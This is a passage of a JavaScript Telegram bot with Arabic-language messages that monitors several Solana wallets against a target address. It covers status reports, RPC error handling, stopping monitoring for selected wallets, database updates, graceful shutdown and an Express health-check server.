            statusMessage += `\`${wallet.publicKey.toString()}\`\n`;
        }

        statusMessage += `\n🎯 عنوان الهدف: ${this.targetAddress.toString()}\n\n`;

        // إحصائيات قاعدة البيانات
        statusMessage += `💾 إحصائيات قاعدة البيانات:\n`;
        statusMessage += `   📁 المحافظ المحفوظة: ${dbStats.total_wallets}\n`;
        statusMessage += `   ✅ المحافظ النشطة: ${this.wallets.length}\n`;
        if (dbStats.first_added) {
            const addedDate = new Date(dbStats.first_added).toLocaleDateString('ar-SA');
            statusMessage += `   📅 أول إضافة: ${addedDate}`;
        }

        this.bot.sendMessage(chatId, statusMessage);
    }

    handleRpcError(error, rpcIndex, walletIndex) {
        const currentTime = Date.now();
        this.rpcErrorCounts[rpcIndex]++;

        const MAX_ERRORS = 5; // Maximum errors before stopping monitoring

        // Check if this RPC has failed too many times
        if (this.rpcErrorCounts[rpcIndex] >= MAX_ERRORS) {
            // Stop monitoring for this specific wallet
            if (this.subscriptionIds[walletIndex - 1]) {
                try {
                    // Ensure connection exists before removing listener
                    if (this.connections[walletIndex - 1]) {
                        this.connections[walletIndex - 1].removeAccountChangeListener(this.subscriptionIds[walletIndex - 1]);
                    }
                    this.subscriptionIds[walletIndex - 1] = null;
                } catch (error) {
                    console.error(`Error removing subscription for wallet ${walletIndex}:`, error.message);
                }
            }

            // Mark this wallet as failed (only track in console, no immediate message)
            if (!this.rpcFailedWallets.has(walletIndex)) {
                this.rpcFailedWallets.add(walletIndex);
                console.log(`🛑 Wallet ${walletIndex} monitoring stopped due to RPC failure (${this.rpcErrorCounts[rpcIndex]} errors)`);
            }
        }

        // Log error for debugging (no Telegram messages for individual errors)
        console.error(`RPC Error - Wallet ${walletIndex} (${this.rpcErrorCounts[rpcIndex]}/${MAX_ERRORS}):`, error.message);
    }

    // إضافة دالة جديدة لإرسال تقرير مجمع عن حالة المراقبة
    async sendMonitoringReport() {
        if (!this.chatId || this.wallets.length === 0) return;

        const activeWallets = this.wallets.length - this.rpcFailedWallets.size;
        const failedWallets = this.rpcFailedWallets.size;

        // إرسال تقرير مجمع كل 5 دقائق فقط
        const reportMessage = `📊 تقرير المراقبة:
✅ محافظ نشطة: ${activeWallets}
❌ محافظ متوقفة: ${failedWallets}
📈 إجمالي المحافظ: ${this.wallets.length}

${failedWallets > 0 ? `⚠️ ${failedWallets} محفظة توقفت بسبب مشاكل RPC\n💡 استخدم /status للتفاصيل` : '🎯 جميع المحافظ تعمل بشكل طبيعي'}`;

        try {
            await this.bot.sendMessage(this.chatId, reportMessage);
        } catch (error) {
            console.error('Error sending monitoring report:', error.message);
        }
    }

    async processStopWallets(chatId, addressesText) {
        const addressLines = addressesText.split('\n').filter(line => line.trim());
        
        if (addressLines.length === 0) {
            this.bot.sendMessage(chatId, '❌ لم يتم إدخال أي عناوين');
            return;
        }

        const walletsToStop = [];
        const notFoundAddresses = [];

        // البحث عن المحافظ المطابقة
        for (const inputAddress of addressLines) {
            const trimmedAddress = inputAddress.trim();
            let found = false;

            for (let i = 0; i < this.wallets.length; i++) {
                const walletAddress = this.wallets[i].publicKey.toString();
                
                // البحث بالعنوان الكامل أو جزء منه
                if (walletAddress === trimmedAddress || 
                    walletAddress.startsWith(trimmedAddress) || 
                    walletAddress.endsWith(trimmedAddress) ||
                    walletAddress.includes(trimmedAddress)) {
                    
                    if (!walletsToStop.includes(i)) {
                        walletsToStop.push(i);
                        found = true;
                    }
                    break;
                }
            }

            if (!found) {
                notFoundAddresses.push(trimmedAddress);
            }
        }

        if (walletsToStop.length === 0) {
            this.bot.sendMessage(chatId, `❌ لم يتم العثور على أي محافظ مطابقة
${notFoundAddresses.length > 0 ? `\n❌ العناوين غير الموجودة:\n${notFoundAddresses.join('\n')}` : ''}`);
            return;
        }

        // إيقاف المحافظ المحددة
        let stoppedCount = 0;
        const stoppedWallets = [];

        // ترتيب المؤشرات تنازلياً لتجنب مشاكل الفهرسة عند الحذف
        walletsToStop.sort((a, b) => b - a);

        for (const walletIndex of walletsToStop) {
            try {
                // إيقاف الاشتراك
                if (this.subscriptionIds[walletIndex]) {
                    this.connections[walletIndex].removeAccountChangeListener(this.subscriptionIds[walletIndex]);
                }

                // حفظ معلومات المحفظة المحذوفة
                const stoppedWallet = {
                    address: this.wallets[walletIndex].publicKey.toString(),
                    index: walletIndex
                };
                stoppedWallets.push(stoppedWallet);

                // إزالة المحفظة من القوائم
                this.wallets.splice(walletIndex, 1);
                this.connections.splice(walletIndex, 1);
                this.subscriptionIds.splice(walletIndex, 1);
                this.lastBalances.splice(walletIndex, 1);

                stoppedCount++;
                console.log(`🛑 Stopped wallet ${walletIndex + 1}: ${stoppedWallet.address}`);

            } catch (error) {
                console.error(`Error stopping wallet ${walletIndex + 1}:`, error.message);
            }
        }

        // تحديث قاعدة البيانات - إلغاء تفعيل المحافظ المحذوفة
        for (const wallet of stoppedWallets) {
            this.db.run(
                'UPDATE wallets SET is_active = 0 WHERE public_key = ? AND chat_id = ?',
                [wallet.address, chatId]
            );
        }

        // إرسال تقرير النتائج
        let resultMessage = `✅ تم إيقاف ${stoppedCount} محفظة بنجاح\n\n`;
        
        if (stoppedWallets.length > 0) {
            resultMessage += `🛑 المحافظ المتوقفة:\n`;
            stoppedWallets.forEach((wallet, index) => {
                const shortAddress = `${wallet.address.slice(0, 8)}...${wallet.address.slice(-4)}`;
                resultMessage += `${index + 1}. ${shortAddress}\n`;
            });
        }

        if (notFoundAddresses.length > 0) {
            resultMessage += `\n❌ عناوين غير موجودة (${notFoundAddresses.length}):\n`;
            notFoundAddresses.forEach(addr => {
                resultMessage += `• ${addr.slice(0, 20)}...\n`;
            });
        }

        resultMessage += `\n📊 المحافظ المتبقية: ${this.wallets.length}`;

        this.bot.sendMessage(chatId, resultMessage);

        // إذا تم إيقاف جميع المحافظ، أوقف المراقبة بالكامل
        if (this.wallets.length === 0) {
            this.stopAllMonitoring();
            this.bot.sendMessage(chatId, '⏹️ تم إيقاف مراقبة جميع المحافظ');
        }
    }

    stopAllMonitoring() {
        // Remove WebSocket subscriptions
        for (let i = 0; i < this.subscriptionIds.length; i++) {
            if (this.subscriptionIds[i] && this.connections[i]) {
                try {
                    this.connections[i].removeAccountChangeListener(this.subscriptionIds[i]);
                    console.log(`🔌 WebSocket subscription ${i + 1} removed`);
                } catch (error) {
                    console.error(`Error removing subscription ${i + 1}:`, error.message);
                }
            }
        }

        // إلغاء تقرير المراقبة المجدول
        if (this.monitoringReportInterval) {
            clearInterval(this.monitoringReportInterval);
            this.monitoringReportInterval = null;
        }

        // تحديث قاعدة البيانات لوضع علامة على انتهاء الجلسة
        if (this.chatId) {
            this.db.run(`
                UPDATE monitoring_sessions
                SET stopped_at = CURRENT_TIMESTAMP
                WHERE chat_id = ? AND stopped_at IS NULL
            `, [this.chatId]);
        }

        this.subscriptionIds = [];
        this.lastBalances = [];

        // Reset error tracking
        this.rpcErrorCounts.fill(0);
        this.lastRpcErrorTime.fill(0);
        this.rpcFailedWallets.clear();
        this.chatId = null;

        console.log('🛑 All WebSocket monitoring stopped');
    }
}

// Initialize and start the bot
async function main() {
    console.log('🤖 Starting Solana Telegram Bot...');
    console.log('=====================================');

    if (!process.env.TELEGRAM_BOT_TOKEN) {
        console.error('❌ TELEGRAM_BOT_TOKEN environment variable is required');
        process.exit(1);
    }

    const bot = new SolanaTelegramBot();
    global.botInstance = bot; // Store globally for graceful shutdown

    console.log('✅ Bot is running and waiting for commands...');
    console.log('💾 قاعدة البيانات المحلية متاحة للحفظ والاستكمال');
}

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('📤 إغلاق البوت...');
    if (global.botInstance && global.botInstance.db) {
        global.botInstance.db.close((err) => {
            if (err) {
                console.error('Error closing database:', err.message);
            } else {
                console.log('💾 تم إغلاق قاعدة البيانات بنجاح');
            }
            process.exit(0);
        });
    } else {
        process.exit(0);
    }
});

// Start the application
main().catch(error => {
    console.error('❌ Fatal error:', error.message);
    process.exit(1);
});

// Add Express server for deployment
const app = express();
const PORT = process.env.PORT || 5000;

app.get('/', (req, res) => {
    res.json({
        status: 'Bot is running',
        message: 'Solana Telegram Bot is active',
        timestamp: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🌐 Express server running on port ${PORT}`);
    console.log(`🔗 Health check: http://localhost:${PORT}/health`);
});